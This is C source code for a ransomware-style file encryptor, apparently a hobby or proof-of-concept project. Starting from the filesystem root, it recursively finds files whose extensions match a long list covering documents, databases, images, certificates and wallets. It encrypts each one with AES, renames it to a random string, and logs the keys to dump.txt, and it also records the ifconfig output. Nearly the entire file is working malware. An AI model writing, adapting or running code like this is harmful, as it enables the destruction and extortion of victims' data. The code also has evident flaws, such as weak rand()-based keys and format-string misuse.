#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <stdint.h>
#include "aes256.h"
#include "file.h"
#include <dirent.h>
#include <setjmp.h>

#define DUMP(s, i, buf, sz)  {printf(s);                   \
                              for (i = 0; i < (sz);i++)    \
                                  printf("%02x ", buf[i]); \
                              printf("\n");}

#define GEN_KEY(i, buf, sz)  {for (i = 0; i < (sz);i++)    \
                                  buf[i] = rand(); }

#define NEW_SIZE 6
#define DEBUG TRUE

static const char dot[] = ".", two_dots[] = "..", slash[] = "/", empty[] = "", dash[] ="-", nullS[] = "\0";
static const char * file_extensions[] = {
    "mid", "wma", "flv", "mkv", "mov", "avi", "asf", "mpeg", "vob", "mpg", "wmv",
    "fla", "swf", "wav", "qcow2", "vdi", "vmdk", "vmx", "gpg", "aes", "ARC", "PAQ",
    "tar", "bz2", "tbk", "bak", "tar", "tgz", "rar", "zip", "djv", "djvu", "svg",
    "bmp", "png", "gif", "raw", "cgm", "jpeg", "jpg", "tif", "tiff", "NEF", "psd",
    "cmd", "bat", "clfile_target", "jar", "java", "asp", "brd", "sch", "dch", "dip", "vbs",
    "asm", "pas", "cpp", "php", "ldf", "mdf", "ibd", "MYI", "MYD", "frm", "odb", "dbf",
    "mdb", "sql", "SQLITEDB", "SQLITE3", "asc", "lay6", "lay", "ms11 (Security copy)",
    "sldm", "sldx", "ppsm", "ppsx", "ppam", "docb", "mml", "sxm", "otg", "odg", "uop",
    "potx", "potm", "pptx", "pptm", "std", "sxd", "pot", "pps", "sti", "sxi", "otp",
    "odp", "wks", "xltx", "xltm", "xlsx", "xlsm", "xlsb", "slk", "xlw", "xlt", "xlm",
    "xlc", "dif", "stc", "sxc", "ots", "ods", "hwp", "dotm", "dotx", "docm", "docx", "DOT",
    "max", "xml", "txt", "CSV", "uot", "RTF", "pdf", "XLS", "PPT", "stw", "sxw", "ott", "odt",
    "DOC", "pem", "csr", "crt", "key", "wallet", "db", "mp3" //"ino"
};
static FILE *fdump;
static unsigned long trouvaille = 0;



char* string_concat(const char *s1, const char *s2)
{
    int isRoot = strcmp(s1, slash);
    char *result = malloc(strlen(s1)+strlen(s2)+ (isRoot ? 1 : 2));
    strcpy(result, s1);
    if(isRoot)
      strcat(result,"/");
    strcat(result, s2);
    printf(result);
    return result;
}

char *shell_dump(const char *name){
    FILE *fd;
    fd = popen(name, "r");
    if (!fd) return 1;
    char   buffer[256];
    size_t chread;
    size_t comalloc = 256;
    size_t comlen   = 0;
    char  *comout   = malloc(comalloc);
    while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
        if (comlen + chread >= comalloc) {
            comalloc *= 2;
            comout = realloc(comout, comalloc);
        }
        memmove(comout + comlen, buffer, chread);
        comlen += chread;
    }
    fwrite(comout, 1, comlen, stdout);
    pclose(fd);
    return comout;
}

int recursive_search(const char *name, int level)
{
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir(name)))
        return 1;
    if (!(entry = readdir(dir)))
        return 1;

   int i;
    do {
        if (entry->d_type == DT_DIR) {
            char path[1024];
            int len = snprintf(path, sizeof(path)-1, "%s/%s", name, entry->d_name);
            path[len] = 0;
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            #ifdef DEBUG
              printf("%*s[%s]\n", level*2, "", path);
            #endif
            recursive_search(path, level + 1);
        }
        else{
          const char *file_ext = get_filename_ext(entry->d_name);
          for (i = 0; i < 141; i++) {
            if(strcmp(file_ext,file_extensions[i]) == 0){
              #ifdef DEBUG
                printf("%*s- %s\n", level*2, "", entry->d_name);
              #endif
              File file_target;
              file_target.name = string_concat(name, entry->d_name);
              if(read_entry(&file_target) == 0){
                file_encrypt(&file_target);
                if(write_entry(&file_target, file_target.name) == 0){
                  char* new_name_d = mkrndstr(NEW_SIZE);
                  char* new_name = string_concat(name, new_name_d);

                  fprintf(fdump, "%s|%s|", file_target.name, new_name);
                  for (i = 0; i < 16;i++)
                      fprintf(fdump,"%02x ", file_target.encryption_key[i]);
                  fprintf(fdump, "\n");

                  if(rename(file_target.name, new_name) == 0){
                    trouvaille++;
                  }
                }
                aes256_done(&file_target.ctx);
              }
              break;
            }
          }

        }
    } while (entry = readdir(dir));
    closedir(dir);
    return 0;
}




#define TRY do{ jmp_buf ex_buf__; if( !setjmp(ex_buf__) ){
#define CATCH } else {
#define ETRY } }while(0)
#define THROW longjmp(ex_buf__, 1)


int main (int argc, char *argv[])
{
  fdump = fopen("dump.txt", "w");
  srand((unsigned)time(NULL));
  if(recursive_search("/", 0) != 0){ //  ~ | / | .. | . @recomm
     printf("Permission not granted");
  }
  printf("%lu files defected \n", trouvaille);
  fprintf(fdump, "netdb  = %s\n", shell_dump("/sbin/ifconfig"));
  fclose(fdump);
  return 0;
}



int directory_scan(char *name){
  struct dirent **namelist;
  int n;
  n = scandir(name, &namelist, NULL, alphasort);
  if (n < 0){
    return -1;
  }
  else {
    while (n--) {
      #ifdef DEBUG
        printf("|%s|\n", namelist[n]->d_name);
      #endif
      if(strcmp(namelist[n]->d_name, dot) == 0  || strcmp(namelist[n]->d_name, two_dots) == 0
        || strcmp(namelist[n]->d_name, dash) == 0 || strcmp(namelist[n]->d_name, empty) == 0
        || strcmp(namelist[n]->d_name, nullS) == 0 || namelist[n]->d_name == '\0'){
        continue;
      }

      if(!directory_scan(string_concat(name,namelist[n]->d_name))){
        free(namelist[n]);
      }
    }
    free(namelist);
   }
  return 0;
}
